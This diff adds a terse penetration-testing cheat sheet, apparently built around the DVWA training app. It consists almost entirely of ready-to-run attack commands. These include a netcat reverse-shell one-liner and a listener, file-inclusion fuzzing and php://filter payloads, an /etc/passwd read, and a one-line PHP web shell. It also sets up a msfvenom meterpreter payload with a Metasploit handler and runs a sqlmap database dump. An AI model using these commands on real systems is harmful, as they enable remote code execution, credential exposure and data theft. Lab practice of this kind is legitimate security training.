@@ -1,0 +1,47 @@
+# location
+# /usr/share/wordlists/rockyou.txt
+
+# gz
+gzip -d file.gz
+
+# Reverse shell
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 1337 >/tmp/f
+
+# File inclusion Fuzzing 
+wfuzz -c --hl 81 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -b "security=low; PHPSESSID=a0bf6sa3dqu1hhrbrcd13f6rko" "http://192.168.1.209/DVWA/vulnerabilities/fi/?page=../../hackable/flags/FUZZ.php"
+
+
+http://192.168.1.209/DVWA/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../hackable/flags/fi.php
+# ---------------
+file:///etc/passwd 
+
+
+# Collection inyectable webfiles
+/usr/share/laudanum
+
+/usr/share/laudanum/php/php-reverse-shell.php 
+
+#PyLocalServer
+sudo python -m http.server 1337
+sudo python2 -m SimpleHTTPServer 1337
+
+#Listen remote Shell 
+nc -nlvp 1337 
+
+#File Upload 
+# <?php system($_REQUEST["cmd"]); ?>
+
+weevely
+
+
+msfvenom -p php/meterpreter_reverse_tcp lhost=127.0.0.1 lport=4444 -f raw > exploit.php
+msfconsole
+use exploit/multi/handler
+set payload php/meterpreter_reverse_tcp
+set lhost 127.0.0.1 
+
+run 
+
+# --------------Sql injection
+sqlmap -r request.txt -p id --dump
+/usr/share/wordlists/wfuzz/Injections/SQL.txt
